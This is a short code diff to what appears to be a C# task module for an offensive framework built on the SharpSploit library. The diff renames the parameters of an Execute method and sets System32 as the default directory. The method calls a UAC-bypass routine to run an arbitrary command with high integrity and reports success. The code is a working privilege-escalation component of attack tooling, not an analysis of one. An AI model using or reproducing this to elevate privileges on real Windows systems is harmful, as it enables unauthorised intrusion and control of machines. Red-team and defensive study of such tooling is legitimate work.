@@ -4,18 +4,18 @@ using SharpSploit.Credentials;
 
 public static class Task
 {
-    public static string Execute(string Binary, string Arguments, string Path, string ProcessID = "0")
+    public static string Execute(string Command, string Parameters, string Directory = "C:\\WINDOWS\\System32\\", string ProcessID = "0")
     {
-        Console.WriteLine("Binary:" + Binary);
-        Console.WriteLine("Arguments:" + Arguments);
-        Console.WriteLine("Path:" + Path);
+        Console.WriteLine("Command:" + Command);
+        Console.WriteLine("Parameters:" + Parameters);
+        Console.WriteLine("Directory:" + Directory);
         Console.WriteLine("ProcessID:" + ProcessID);
 
         using (Tokens t = new Tokens())
         {
-            if (t.BypassUAC(Binary, Arguments, Path, Int32.Parse(ProcessID)))
+            if (t.BypassUAC(Command, Parameters, Directory, Int32.Parse(ProcessID)))
             {
-                return "Successfully executed: \"" + Path + Binary + " " + Arguments + "\" with high integrity.";
+                return "Successfully executed: \"" + Directory + Command + " " + Parameters + "\" with high integrity.";
             }
             else
             {
